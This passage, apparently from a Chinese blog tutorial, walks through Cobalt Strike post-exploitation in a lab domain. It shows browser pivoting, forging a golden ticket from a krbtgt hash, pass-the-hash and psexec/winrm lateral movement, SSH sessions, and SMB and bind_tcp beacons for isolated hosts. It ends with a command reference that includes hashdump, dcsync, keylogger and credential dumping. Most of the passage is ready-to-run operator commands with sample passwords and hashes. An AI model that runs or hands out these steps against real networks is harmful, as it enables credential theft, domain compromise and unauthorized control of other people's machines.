6436和6544，我们随便选中一个即可。我这里选择 6544进程，然后下面会有一个默认的代理服务端口。点击开始</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078023819-a5d16c30-6a0b-4b32-b585-d8edc73dbd29-20220401150230670.png" alt="img"></p><p>可以看到命令行如下：browserpivot 6544 x86</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078024023-0009a7db-f7b1-4602-aa23-52b7bdeef5e2-20220401150231227.png" alt="img"></p><p>然后视图代理信息可以看到刚刚建立的浏览器代理。这里的意思是，TeamServer监听59398和26193端口。流程是这样，我们将流量给59398端口，59398端口将流量给26193端口，26193将流量给目标主机的26193端口。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078024246-e0403434-274d-4fdf-9e1c-51002dc4c3b9-20220401150230758.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078024463-543a4a13-970f-40c5-a708-fd346d94bb3e-20220401150230772.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078024672-6ab81ab4-e6be-4cdc-9dd9-173a792eab6d-20220401150230914.png" alt="img"></p><p>我们这里代理设置TeamServer服务器的ip和59398端口即可。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078024865-7516dea7-d96f-4d26-8acc-5921fe244805-20220401150230884.png" alt="img"></p><p>访问Fofa，可以看到以目标身份登录了网站。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078024989-b25a1358-8a95-4ec2-95d7-73295612be8e-20220401150231120.png" alt="img"></p><h3 id="生成黄金票据注入当前会话-Golden-Ticket"><a href="#生成黄金票据注入当前会话-Golden-Ticket" class="headerlink" title="生成黄金票据注入当前会话(Golden Ticket)"></a>生成黄金票据注入当前会话(Golden Ticket)</h3><p>生成黄金票据的前提是我们已经获得了krbtgt用户的哈希：9ce0b40ed1caac7523a22d574b32deb2 。并且已经获得一个以域用户登录的主机权限</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078024989-d7df5e47-4976-4dcd-b5d4-add3b3c71670-20220401150230959.png" alt="img"></p><p>右键当前获得的主机——&gt;Access——&gt;Golden Ticket</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078025131-5247d075-fe37-457b-9c30-141f1aa23133-20220401150231130.png" alt="img"></p><p>在弹出来的对话框中输入以下：</p><ul><li>User：要伪造用户名，这里我们一般填administrator</li><li>Domain：域名</li><li>Domain SID：域SID</li><li>Krbtgt Hash：krbtgt用户的哈希</li></ul><p>然后点击Build即可</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078026014-811fff7e-6ded-43e0-a49a-a641bbf8aa51-20220401150231863.png" alt="img"></p><p>这是输入框自动执行的mimikatz命令，如图票据传递攻击成功。我们查看域控的C盘，输入如下命令，注意这里域控必须是主机名形式，而不能是ip</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shell  <span class="token builtin">dir</span> \\win2008<span class="token punctuation">.</span>xie<span class="token punctuation">.</span>com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078026152-1d262dd1-5fab-4085-a87b-9a91c64a4b18-20220401150231788.png" alt="img"></p><p>然后可以导出域内所有用户的哈希了</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078027352-e409b8c5-09a7-42b6-81a8-0d764ef46598-20220401150233377.png" alt="img"></p><h3 id="凭证转换-Make-Token"><a href="#凭证转换-Make-Token" class="headerlink" title="凭证转换(Make Token)"></a>凭证转换(Make Token)</h3><p>如果我们已经获得了计算机的本地管理员或域管理员的账号密码，就可以使用此模块生成令牌，此时生成的令牌具有指定用户的身份。</p><ul><li>rev2self: Revert to your original access token(还原到原始的访问令牌)</li><li>make_token: Clone the current access token and set it up to pass the specified username and password when you interact with network resources. This command does not<br>validate the credentials you provide and it has no effect on local actions.（克隆当前访问令牌并将其设置为传递指定的用户名以及与网络资源交互时的密码。 这个命令没有<br>验证您提供的凭据，并且它对本地操作没有影响。）</li><li>psexec: Spawn a session on a remote host. This command generates an executable, copies it to the target, creates a service to run it, and cleans up after itself. You must specify which share (e.g., ADMIN$ or C$) to copy the file to。(在远程主机上生成会话。 此命令生成一个可执行文件，将其复制到目标，创建一个服务来运行它，并在其本身之后进行清理。 您必须指定要将文件复制到哪个共享(例如，ADMIN$或C$。)</li></ul><p>右键当前获得的主机——&gt;Access——&gt;Make Token</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078026119-25667bf0-6a1b-48d5-8bc3-b312d322ceb3-20220401150233388.png" alt="img"></p><p>输入已经获得了域用户的账号密码和域名，点击Build</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078026213-f56b60a9-e12b-48c0-b67a-a6deef72bf7a-20220401150231998.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rev2self  <span class="token comment">#这一步可以省略</span>make_token xie\administrator P@ssword123jump psexec <span class="token number">192.168</span><span class="token number">.106</span><span class="token number">.10</span> smbunlink <span class="token number">192.168</span><span class="token number">.106</span><span class="token number">.10</span>  <span class="token comment">#取消连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078028092-86ea88b1-813f-4c58-85c5-0de5e622ea5f-20220401150232494.png" alt="img"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>右键——&gt;目标——&gt;端口扫描，然后填入要扫描的端口和网段。这里我们也可以直接执行命令：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">portscan <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.1</span><span class="token operator">-</span><span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.10</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">445</span> arp  <span class="token number">1024</span>portscan <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.1</span><span class="token operator">-</span><span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.10</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">445</span> icmp <span class="token number">1024</span>portscan <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.1</span><span class="token operator">-</span><span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.10</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">445</span> none <span class="token number">1024</span>一般我们直接运行命令portscan <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">445</span><span class="token punctuation">,</span><span class="token number">1433</span><span class="token punctuation">,</span><span class="token number">3306</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078027333-98330e21-40c4-4d89-be50-136c3573e477-20220401150232144.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078027453-a36703cd-e835-4675-ab28-adb6637302d0-20220401150232285.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078028238-32bb2414-018a-4af8-8eaf-9554e95ee2b1-20220401150232478.png" alt="img"></p><p>扫完了之后，直接在控制台就会有结果。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078028287-0dd63a24-a7c6-485b-826c-dfb9fc2d87f4-20220401150232669.png" alt="img"></p><p>我们点击视图——&gt;目标，就会出现网段中存活的主机。(这是通过端口扫描探测到的结果显示的，要想这里显示，必须得先进行扫描端口)</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078028554-2efc179e-3307-41ff-ae78-e0f473ee91dc-20220401150232636.png" alt="img"></p><h3 id="哈希传递攻击或SSH远程登录"><a href="#哈希传递攻击或SSH远程登录" class="headerlink" title="哈希传递攻击或SSH远程登录"></a>哈希传递攻击或SSH远程登录</h3><p>进行了上一步的端口扫描后，我们这里视图——&gt;目标就会有当前网段的存活主机。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078029066-0290815a-b5e0-4d59-9e2c-b2e9770efc48-20220401150232791.png" alt="img"></p><p><strong>对于Linux机器，如果我们知道账号密码的话，可以远程SSH连接，并返回一个CS的session。</strong></p><p>需要一台服务器作为中继才可以控制Linux服务器，我们这里先获取到一个windows服务器的权限，然后进入windows服务器的beacon进行执行命令</p><p>可以两种方式远程连接：ssh 和 ssh-key</p><p>可以图形化操作，也可以命令行操作：ssh 192.168.10.13:22 root root</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078029334-b03acb65-0b73-47df-8454-b6665d6804d9-20220401150232791.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078029746-cd447ddb-1cf9-43cc-a0f4-b351d6ec5510-20220401150232950.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078029767-69f4142c-5593-4d03-80c1-17e65fdf8864-20220401150232851.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078030051-fe2e48cc-d98f-4eb4-ab25-7018aafc3b3a-20220401150232967.png" alt="img"></p><p><strong>对于Linux机器，也可以使用SSH公私钥进行登录，并返回一个CS的session。</strong></p><p>需要一台服务器作为中继才可以控制Linux服务器，我们这里先获取到一个windows服务器的权限，然后进入windows服务器的beacon进行执行命令</p><p>首先，将公钥authorized_keys放到目标主机的&#x2F;root&#x2F;.ssh&#x2F;目录下</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078030118-2efa7d51-f846-4ab0-9471-a510d46273ff-20220401150233015.png" alt="img"></p><p>然后我们本地机器放私钥，远程连接</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ssh<span class="token operator">-</span>key <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.13</span><span class="token punctuation">:</span><span class="token number">22</span> root e<span class="token punctuation">:</span>\id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078030148-56d166df-cdb0-44ff-aa9b-6e5cd04992ad-20220401150233030.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078030756-3e6caf6a-c3a9-4454-a04b-c75a220bed39-20220401150233137.png" alt="img"></p><p><strong>对于Windows机器，如果我们获取到账号和密码(明文或者哈希)，都可以进行远程连接</strong></p><p>远程连接的前提是目标机器开放了445端口，然后CS会通过远程连接开启一个CS的seesion。可以用以下方式远程连接：psexec 、psexec64、psexec_psh 、winrm 和 winrm64。实测使用 <strong>psexec_psh</strong> 成功率最高。</p><p>已经得到机器Win2008的密码为：root （329153f560eb329c0e1deea55e88a1e9），现在想哈希传递Win2003机器。监听器为：test</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">如果知道知道密码哈希的话：rev2selfpth WIN2008\Administrator 329153f560eb329c0e1deea55e88a1e9psexec的命令：jump psexec WIN2003 testpsexec64的命令jump psexec64 WIN2003 testpsexec_psh的命令：jump psexec_psh WIN2003 testwinrm的命令：jump winrm WIN2003 testwinrm64的命令： jump winrm64 WIN2003 test如果是知道明文密码的话：rev2selfmake_token WIN2008\Administrator rootpsexec的命令：jump psexec WIN2003 testpsexec64的命令jump psexec64 WIN2003 testpsexec_psh的命令：jump psexec_psh WIN2003 testwinrm的命令：jump winrm WIN2003 testwinrm64的命令： jump winrm64 WIN2003 test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078030772-c67a6510-f429-44c0-ba6a-b0b4158fc115-20220401150233144.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078030797-df758fde-7bb2-4717-8da2-d5aefbffa85d-20220401150233246.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078031050-5c6f693c-68a9-4e12-b1af-4f1dad8d7112-20220401150233366.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078031113-71a8aab6-ab37-41ba-aafc-813f73fe3d5a-20220401150233367.png" alt="img"></p><p><strong>如果遇到目标机器不出网的情况，则我们需要在已经被控的主机上建立一个listen，以此作为中继。</strong></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078031644-2457c5e4-2334-41c8-bccc-4efb89369655-20220401150233627.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078031714-bf93b24b-b4e6-4270-a35b-665d1064a959-20220401150233520.png" alt="img"></p><p>然后攻击的时候的监听器选择我们刚刚用被控主机建立的listen即可。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078031808-0ff42684-71da-4cbf-ada2-e50dc9b5ecaf-20220401150233511.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078031809-0af68061-047e-430d-b6ad-01fefdb638a1-20220401150233875.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078032633-cf79aff9-9d62-44d2-99db-cbb446830d1c-20220401150233970.png" alt="img"></p><p>当在目标主机执行了该木马后，就可以看到上线了。我们可以在Beacon上用link <ip>命令链接它或者unlink <ip>命令断开它</ip></ip></p><p>但是这样会导致的一个后果就是，只要第一个被控主机掉线，通过该主机中继打下的内网其他主机也都会掉线。</p><h3 id="导入并执行本地的PowerShell脚本"><a href="#导入并执行本地的PowerShell脚本" class="headerlink" title="导入并执行本地的PowerShell脚本"></a>导入并执行本地的PowerShell脚本</h3><ul><li>powershell-import：该模块可以将本地PowerShell脚本加载到目标系统的内存中，然后使用PowerShell执行所加载脚本中的方法</li><li>powershell：该模块通过调用PowerShell.exe 来执行命令</li><li>powerpick：该命令可以不通过调用PowerShell.exe 来执行命令</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">powershell<span class="token operator">-</span><span class="token keyword">import</span> E<span class="token punctuation">:</span>\PowerView<span class="token punctuation">.</span>ps1 powershell Get<span class="token operator">-</span>NetUser <span class="token operator">|</span> select name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078032650-7f9b2840-825f-47d8-8a57-21a9d4ae069c-20220401150233620.png" alt="img"></p><h3 id="Beacon-TCP的使用"><a href="#Beacon-TCP的使用" class="headerlink" title="Beacon TCP的使用"></a>Beacon TCP的使用</h3><p>我们打下了一个目标机器192.168.202.54，但是该机器不出网，我们现在想让其上线cs。我们的思路是这样的，通过配置代理，让本地虚拟机可以访问到目标机器。然后让本地虚拟机上线cs，走bind_tcp去连接目标机器。</p><ul><li>本地虚拟机：192.168.10.132</li><li>目标机器：192.168.10.128(不出网)</li></ul><p><strong>本地虚拟机上线cs，配置proxifier</strong></p><p>使用本地虚拟机，使用exe或powershell方式上线cs(注意不要用派生的session)。</p><p>在win2008机器上配置好proxifier，如下</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078032865-880fe19a-2ae8-41cb-995a-b88c11fb8b9e-20220401150233680.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078033239-395618a3-e704-40da-8453-50044a5779ad-20220401150233704.png" alt="img"></p><p><strong>监听bind_tcp</strong></p><p>设置bind_tcp监听方式，默认监听42585端口，我们可以自己修改。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078032893-ce7c549b-60ba-47f1-83cf-b80a8c8aa909-20220401150233948.png" alt="img"></p><p>生成bind_tcp的木马</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078033508-07a4b09c-c167-4e22-8c1a-6798ee525b23-20220401150233779.png" alt="img"></p><p>将该木马上传到win7机器上，执行，可以看到，监听了42585端口</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078033614-816a16ae-fafd-48c9-afbd-594ac7bdf24e-20220401150233758.png" alt="img"></p><p>然后可以在cs上上线的机器探测端口：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">portscan <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.128</span> <span class="token number">42585</span> none <span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在win2008机器上执行命令，可以看到win7正常上线</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">连接connect  <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.128</span> 取消连接unlink   <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.128</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078033712-b5a969ce-702a-48ad-ab5a-e3f9c23fe0ca-20220401150233867.png" alt="img"></p><p>点进去win7的session里面，输入 sleep 1</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078034405-76881388-4a94-48ce-8d7e-ae8b2e1d8a3f-20220401150233846.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078034398-2a6cb5ca-3321-4b26-8448-f4a613d15b84-20220401150233930.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078034466-e27574fc-7da4-4379-9649-c44d5350d115-20220401150233916.png" alt="img"></p><h3 id="Beacon-SMB的使用"><a href="#Beacon-SMB的使用" class="headerlink" title="Beacon SMB的使用"></a>Beacon SMB的使用</h3><p>SMB Beacon使用命名管道与父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。<br>这张图很好的诠释了SMB beacon的工作流程。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078034487-f2583aaa-bad1-403e-9afd-268acb164060-20220401150234302.png" alt="img"></p><p>SMB Beacon的使用条件：</p><ul><li>具有 SMB Beacon 的主机必须接受 445 端口上的连接</li><li>只能链接由同一个 Cobalt Strike 实例管理的 Beacon</li><li>利用这种beacon横移必须有目标主机的管理员组的权限或者说是拥有具有管理员组权限的凭据。</li></ul><p><strong>SMB Beacon的使用场景：</strong></p><ol><li>我们知道了目标机器的管理员账号的明文密码或密码哈希。但是目标主机不出网，所以我们想利用SMB Beacon正向连接让其上线。</li><li>还有一种使用场景是，在域环境中，我们已经得到一个域用户的账号密码。由于在域中，默认域用户可以登录除域控外的所有主机。所以我们可以利用该域用户与其他主机建立IPC连接，然后让其他主机进行SMB Beacon上线。</li></ol><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078034557-03db1604-ab8a-474c-853f-92a330bfb449-20220401150233988.png" alt="img"></p><p>首先，建立一个SMB Beacon的监听：SMB_Beacon</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078035091-9841c974-ac7f-4c9b-a5bc-5b1cb9afffe4-20220401150234003.png" alt="img"></p><p><strong>利用明文密码让其上线SMB Beacon</strong></p><p>先建立一个IPC连接，然后连接：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shell net use \\<span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span> <span class="token operator">/</span>u<span class="token punctuation">:</span>administrator rootjump psexec_psh <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span> SMB_Beacon取消连接unlink <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span>如果是域内shell net use \\<span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span> <span class="token operator">/</span>u<span class="token punctuation">:</span>xie\administrator root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078035293-01ebeb66-177a-4be7-ac33-556fbbd71b1d-20220401150234265.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078035271-2b10bf54-8825-4040-9a9d-06f4e22e30a2-20220401150234180.png" alt="img"></p><p><strong>利用密码哈希上线SMB Beacon</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rev2selfpth WIN2003\Administrator 329153f560eb329c0e1deea55e88a1e9jump psexec_psh <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span> SMB_Beacon取消连接unlink <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.132</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078035439-84335e7e-ba2b-4fc0-8901-10cc27437dd1-20220401150234182.png" alt="img"></p><h2 id="CobaltStrike常见命令"><a href="#CobaltStrike常见命令" class="headerlink" title="CobaltStrike常见命令"></a>CobaltStrike常见命令</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">BeaconCommands<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>    Command                   Description    <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>                   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>    browserpivot              注入受害者浏览器进程    bypassuac                 绕过UAC    cancel                    取消正在进行的下载    cd                        切换目录    checkin                   强制让被控端回连一次    clear                     清除beacon内部的任务队列    connect                   Connect to a Beacon peerover TCP    covertvpn                 部署Covert VPN客户端    cp                        复制文件    dcsync                    从DC中提取密码哈希    desktop                   远程VNC    dllinject                 反射DLL注入进程    dllload                   使用LoadLibrary将DLL加载到进程中    download                  下载文件    downloads                 列出正在进行的文件下载    drives                    列出目标盘符    elevate                   尝试提权   execute                   在目标上执行程序<span class="token punctuation">(</span>无输出<span class="token punctuation">)</span>    execute<span class="token operator">-</span>assembly          在目标上内存中执行本地<span class="token punctuation">.</span>NET程序    exit                      退出beacon    getprivs                  Enable system privileges oncurrent token    getsystem                 尝试获取SYSTEM权限    getuid                    获取用户ID    hashdump                  转储密码哈希值    <span class="token builtin">help</span>                      帮助    inject                    在特定进程中生成会话    jobkill                   杀死一个后台任务    jobs                      列出后台任务    kerberos_ccache_use       从ccache文件中导入票据应用于此会话    kerberos_ticket_purge     清除当前会话的票据    kerberos_ticket_use       从ticket文件中导入票据应用于此会话    keylogger                 键盘记录    kill                      结束进程    link                      Connect to a Beacon peerover a named pipe    logonpasswords            使用mimikatz转储凭据和哈希值    ls                        列出文件    make_token                创建令牌以传递凭据    mimikatz                  运行mimikatz    mkdir                     创建一个目录    mode dns                  使用DNS A作为通信通道<span class="token punctuation">(</span>仅限DNS beacon<span class="token punctuation">)</span>    mode dns<span class="token operator">-</span>txt              使用DNS TXT作为通信通道<span class="token punctuation">(</span>仅限D beacon<span class="token punctuation">)</span>    mode dns6                 使用DNS AAAA作为通信通道<span class="token punctuation">(</span>仅限DNS beacon<span class="token punctuation">)</span>    mode http                 使用HTTP作为通信通道    mv                        移动文件    net                       net命令    note                      备注          portscan                  进行端口扫描    powerpick                 通过Unmanaged PowerShell执行命令    powershell                通过powershell<span class="token punctuation">.</span>exe执行命令    powershell<span class="token operator">-</span><span class="token keyword">import</span>         导入powershell脚本    ppid                      Set parent PID forspawned post<span class="token operator">-</span>ex jobs    ps                        显示进程列表    psexec                    Use a service to spawn asession on a host    psexec_psh                Use PowerShell to spawn asession on a host    psinject                  在特定进程中执行PowerShell命令    pth                       使用Mimikatz进行传递哈希    pwd                       当前目录位置    reg                       Query the registry    rev2self                  恢复原始令牌    rm                        删除文件或文件夹    rportfwd                  端口转发    run                       在目标上执行程序<span class="token punctuation">(</span>返回输出<span class="token punctuation">)</span>    runas                     以另一个用户权限执行程序    runasadmin                在高权限下执行程序    runu                      Execute a program underanother PID    screenshot                屏幕截图    setenv                    设置环境变量    shell                     cmd执行命令    shinject                  将shellcode注入进程    shspawn                   生成进程并将shellcode注入其中    sleep                     设置睡眠延迟时间    socks                     启动SOCKS4代理    socks stop                停止SOCKS4    spawn                     Spawn a session    spawnas                   Spawn a session <span class="token keyword">as</span> anotheruser    spawnto                  Set executable tospawn processes into    spawnu                    Spawn a session underanother PID    ssh                       使用ssh连接远程主机    ssh<span class="token operator">-</span>key                   使用密钥连接远程主机    steal_token               从进程中窃取令牌    timestomp                 将一个文件时间戳应用到另一个文件    unlink                    Disconnect <span class="token keyword">from</span> parentBeacon    upload                    上传文件    wdigest                   使用mimikatz转储明文凭据    winrm                     使用WinRM在主机上生成会话    wmi                       使用WMI在主机上生成会话    argue                     进程参数欺骗<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具的使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具的使用 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
